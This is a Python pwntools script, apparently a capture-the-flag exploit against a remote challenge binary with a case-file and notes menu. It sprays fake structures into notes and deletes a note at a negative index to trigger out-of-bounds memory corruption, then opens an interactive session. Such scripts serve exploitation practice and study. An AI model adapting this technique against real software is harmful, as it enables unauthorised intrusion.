#!/usr/bin/env python3
from pwn import *

LOCAL = False
if LOCAL:
    r = process("./ecpd")
else:
    r = remote("challenges.ctfd.io", 30482)

r.recvuntil("Quit\n\n")

def go_file():
    r.sendline("1")
    r.recvuntil(">> ")

def go_note():
    r.sendline("2")
    r.recvuntil(">> ")

def go_main():
    r.sendline("4")
    r.recvuntil(">> ")

def create_note(content):
    log.info("create note")
    r.sendline("1")
    r.recvuntil(">> ")
    r.sendline(content)
    r.recvuntil(">> ")

def delete_note(idx):
    log.info("delete note")
    r.sendline("2")
    r.recvuntil(">> ")
    r.sendline(str(idx))

def create_file(name, perp, aff, note):
    log.info("create file")
    r.sendline("1")
    r.sendlineafter(">> ", name)
    r.sendlineafter(">> ", perp)
    r.sendlineafter(">> ", aff)
    r.sendlineafter(">> ", note)
    r.recvuntil(">> ")

def print_file(idx):
    r.sendline("3")
    r.sendlineafter(">> ", str(idx))
    r.recvuntil("Perp Name : ")
    perp = r.recvline().strip(b"\n")
    r.recvuntil("Perp Affiliation : ")
    aff = r.recvline().strip(b"\n")
    r.recvuntil("Case Note :\n")
    note = r.recvuntil(">> ")

go_note()
for i in range(29 + 4):
    create_note(p32(1) + p32(0) + b"FILE_TOPSEC_0000\x00")
go_main()
go_file()
for i in range(29):
    create_file(str(0x61 + i) * 8, "", "", "")
go_main()
for i in range(29 + 3):
    go_note()
    delete_note(-28)

r.interactive()
